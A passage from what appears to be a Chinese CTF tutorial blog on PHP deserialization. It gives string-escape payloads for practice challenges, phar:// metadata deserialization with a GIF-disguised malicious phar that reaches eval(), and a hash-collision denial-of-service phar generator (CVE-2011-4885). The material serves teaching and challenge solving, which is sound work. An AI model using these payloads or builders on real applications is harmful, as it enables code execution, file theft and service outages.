class="hljs-string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> message(a,b,<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$umsg</span> = str_replace(<span class="hljs-string">&#x27;fuck&#x27;</span>, <span class="hljs-string">&#x27;loveU&#x27;</span>, serialize(<span class="hljs-variable">$c</span>));<br><span class="hljs-keyword">echo</span> base64_encode(<span class="hljs-variable">$umsg</span>);<br></code></pre></td></tr></table></figure><p>或者直接在index.php传值</p><blockquote><p>f=a&amp;m=b&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”;s:5:”token”;s:5:”admin”;}</p></blockquote><p>访问message.php</p><ul><li>某校的一题</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;secured&#x27;</span>, <span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题步骤：</p><p>首先得到序列化的字符串<code>O:6:&quot;Hacker&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Marble&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>截取需要逃逸的字符串<code>&quot;;s:8:&quot;password&quot;;s:6:&quot;hacker&quot;;&#125;</code></p><p>长度为31，secure全部替换为secured，字符串+1，则需要<code>31</code>个secure把目标字符串顶出去</p><p>payload：</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecure”;s:8:”password”;s:6:”hacker”;}&amp;password=</p></blockquote><p>题目改一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$a</span> = str_replace(<span class="hljs-string">&#x27;secure&#x27;</span>, <span class="hljs-string">&#x27;securing&#x27;</span>, <span class="hljs-variable">$str</span>);<br><br>    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">&#x27;love&#x27;</span>, <span class="hljs-string">&#x27;lover&#x27;</span>, <span class="hljs-variable">$a</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;Marble&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;fucku&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$h</span> = <span class="hljs-keyword">new</span> Hacker();<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-comment">//Security filtering</span><br>    <span class="hljs-variable">$h</span>-&gt;username = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-variable">$c</span> = unserialize(filter(serialize(<span class="hljs-variable">$h</span>)));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span>-&gt;password === <span class="hljs-string">&#x27;hacker&#x27;</span>) &#123;<br>        var_dump(file_get_contents(<span class="hljs-string">&#x27;./flag.php&#x27;</span>));<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>可见此处secure变为了secure，love变为lover</p><p>仍然要逃逸31个字符，当然可以31个love，直接可以逃逸，但是也可以构造15个secure和一个love</p><p>payload：</p><blockquote><p>username=securesecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecuresecurelove”;s:8:”password”;s:6:”hacker”;}&amp;password=1</p></blockquote><h3 id="减少："><a href="#减少：" class="headerlink" title="减少："></a>减少：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$function</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>];<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>)&#123;<br> <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$_SESSION</span>);<br>&#125;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;function&#x27;</span>] = <span class="hljs-variable">$function</span>;<br>extract(<span class="hljs-variable">$_POST</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$function</span>)&#123;<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot; rel=&quot;external nofollow&quot; &gt;source_code&lt;/a&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>])&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;img&#x27;</span>] = sha1(base64_encode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img_path&#x27;</span>]));<br>&#125;<br><span class="hljs-variable">$serialize_info</span> = filter(serialize(<span class="hljs-variable">$_SESSION</span>));<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;highlight_file&#x27;</span>)&#123;<br> highlight_file(<span class="hljs-string">&#x27;index.php&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;phpinfo&#x27;</span>)&#123;<br> <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$function</span> == <span class="hljs-string">&#x27;show_image&#x27;</span>)&#123;<br> <span class="hljs-variable">$userinfo</span> = unserialize(<span class="hljs-variable">$serialize_info</span>);<br> <span class="hljs-keyword">echo</span> file_get_contents(base64_decode(<span class="hljs-variable">$userinfo</span>[<span class="hljs-string">&#x27;img&#x27;</span>]));<br>&#125;<br></code></pre></td></tr></table></figure><p>extract变量覆盖,file_get_contents任意文件读取.</p><p>将变量$userinfo[‘img’]逆推回去发现,是由参数img_path控制的,但是经过sha1加密,我们无法得知加密后内容,但结合前面的extract变量覆盖,我们可以自己POST构造.</p><p>构造了之后,会经过序列化filter函数替换一些字符(那么此时序列化后的数据则发生了变化,可能存在漏洞),再反序列化,读取参数值.</p><p>序列化后,有三个元素,分别是img,user,function,而我们能控制的只有后面两个,我们需要构造的payload是这样的</p><blockquote><p>f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;}</p></blockquote><p>但是不经任何改变则是这样的</p><blockquote><p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p></blockquote><p>利用截断的思想不让其读取元素img的值,我们自己来构造这个值,只有两个参数,必须在function哪里截断,而这个反序列是长度递减,那么就是选择元素吞噬(吞噬的长度自己酌情参考,一般是到自己能控制的点就好)后面的长度,来构造自己的payload咯,我们就选user元素吧,len(‘“;s:8:”function”;s:10:”‘)的长度为23,但是我们无法构造23个长度,我们可以多吞噬一个,24个字符,那么就用6个flag就好,但是这样后面的序列化就混乱了,我们就要添加自己的payload,并补全.虽然这样补好了,但是只有两个元素,这里需要三个元素,我们就再添加元素,并将后面的img进行截断</p><blockquote><p>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:10:”show_image”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}<br>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:2:”22”;s:3:”img”;s:40:”1b75545ff7fcd63fb78a7e4f52a0500d4f39b8f5”;}</p></blockquote><p> 截断只需}即可,并且不为读取的字符即可,因此添加f”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;s:3:”tql”;s:3:”tql”;},这里我们新增了一个元素,因此吞噬后function元素消失了,随便补充好元素即可.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$img</span></span>)</span>&#123;<br> <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br> <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br> <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$img</span>);<br>&#125;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;user&quot;</span>=&gt;<span class="hljs-string">&quot;flagflagflagflagflagflag&quot;</span>,<br> <span class="hljs-string">&quot;function&quot;</span>=&gt;<span class="hljs-string">&#x27;2&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:3:&quot;tql&quot;;s:3:&quot;tql&quot;;&#125;&#x27;</span>,<br> <span class="hljs-comment">//&quot;user&quot;=&gt;&#x27;guest&#x27;,</span><br> <span class="hljs-comment">//&quot;function&quot;=&gt;&#x27;show_image&#x27;,</span><br> <span class="hljs-string">&quot;img&quot;</span>=&gt;sha1(base64_encode(<span class="hljs-string">&#x27;guest_img.png&#x27;</span>))<br>);<br>print_r(serialize(<span class="hljs-variable">$arr</span>));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(filter(serialize(<span class="hljs-variable">$arr</span>)));<br><span class="hljs-keyword">echo</span> PHP_EOL;<br>print_r(unserialize(filter(serialize(<span class="hljs-variable">$arr</span>))));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="phar拓宽反序列化的攻击面"><a href="#phar拓宽反序列化的攻击面" class="headerlink" title="phar拓宽反序列化的攻击面"></a>phar拓宽反序列化的攻击面</h2><p>利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（file_exists()、is_dir()等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p><p>一个生成phar的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    @unlink(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> Test();<br>    <span class="hljs-variable">$o</span>-&gt;data = <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;stopBuffering();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210801184545865.png"></p><blockquote><ul><li>a <strong>stub</strong></li></ul><p>含有&lt;?php xxx; __HALT_COMPILER();?&gt;  以__HALT_COMPILER();?&gt;结尾</p><ul><li>a <strong>manifest</strong> describing the contents</li></ul><p>存储每个压缩文件的权限、属性等信息，还有用户自定义的meta-data以序列化后的字符串</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/image-20210729113615040.png"></p><ul><li>the file <strong>contents</strong></li></ul><p>压缩文件内容</p><ul><li>[optional] a <strong>signature</strong> for verifying Phar integrity (phar file format only)</li></ul><p>签名(可选)，位于文件尾</p></blockquote><p>利用条件</p><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;data;<br>    &#125;<br>&#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar/test.txt&#x27;</span>;<br>    file_exists(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1.png"></p><h3 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h3><p>上面的代码其实已经存在任意代码执行了</p><blockquote><p>$o-&gt;data=<code>dir</code>;</p></blockquote><h3 id="绕过文件幻数检测"><a href="#绕过文件幻数检测" class="headerlink" title="绕过文件幻数检测"></a>绕过文件幻数检测</h3><p>恶意phar生成：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><p>修改后缀为gif 然后上传</p><blockquote><p>?filename=phar://upload_file/phar.gif</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eval</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-keyword">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; startBuffering();<br><span class="hljs-variable">$phar</span> -&gt; setStub(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> AnyClass();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<span class="hljs-comment">//修改</span><br><span class="hljs-variable">$phar</span> -&gt; setMetadata(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; stopBuffering();<br></code></pre></td></tr></table></figure><h3 id="PHP内核哈希表碰撞攻击-CVE-2011-4885"><a href="#PHP内核哈希表碰撞攻击-CVE-2011-4885" class="headerlink" title="PHP内核哈希表碰撞攻击(CVE-2011-4885)"></a>PHP内核哈希表碰撞攻击(CVE-2011-4885)</h3><p>参考<a href="https://cloud.tencent.com/developer/article/1350367">https://cloud.tencent.com/developer/article/1350367</a></p><p>在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) =&gt; O(n)）来触发拒绝服务攻击。</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1.jpeg"></p><p>PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。</p><p>生成恶意phar代码 这里开始就不懂了  PHP内核探索:哈希表碰撞攻击原理<a href="https://www.jb51.net/article/70383.htm">https://www.jb51.net/article/70383.htm</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$size</span>= pow(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>);<br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$key</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$maxKey</span> = (<span class="hljs-variable">$size</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$size</span>; <span class="hljs-variable">$key</span> &lt;= <span class="hljs-variable">$maxKey</span>; <span class="hljs-variable">$key</span> += <span class="hljs-variable">$size</span>) &#123;<br>    <span class="hljs-variable">$array</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-variable">$new_obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;<br><span class="hljs-variable">$new_obj</span>-&gt;hacker = <span class="hljs-variable">$array</span>;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/avatar.phar&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;hacker.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$new_obj</span>);<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br></code></pre></td></tr></table></figure><p>测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$startTime</span> = microtime(<span class="hljs-literal">true</span>);<br>file_exists(<span class="hljs-string">&quot;phar://avatar.phar&quot;</span>);<br><span class="hljs-variable">$endTime</span> = microtime(<span class="hljs-literal">true</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;执行时间：  &#x27;</span>.(<span class="hljs-variable">$endTime</span> - <span class="hljs-variable">$startTime</span>). <span class="hljs-string">&#x27; 秒&#x27;</span>; <br></code></pre></td></tr></table></figure><h3 id="HITCON-2017-Baby-h-Master-PHP"><a href="#HITCON-2017-Baby-h-Master-PHP" class="headerlink" title="[HITCON 2017]Baby^h Master PHP"></a>[HITCON 2017]Baby^h Master PHP</h3><p>分享本题自制Dockerfile : <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/baby%5Eh-master-php-2017">Github</a></p><p>这题在比赛过程是0解……真的太难了…体现了Orange大大对php和中间件的深刻理解Orz 膜拜</p><p>题目源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 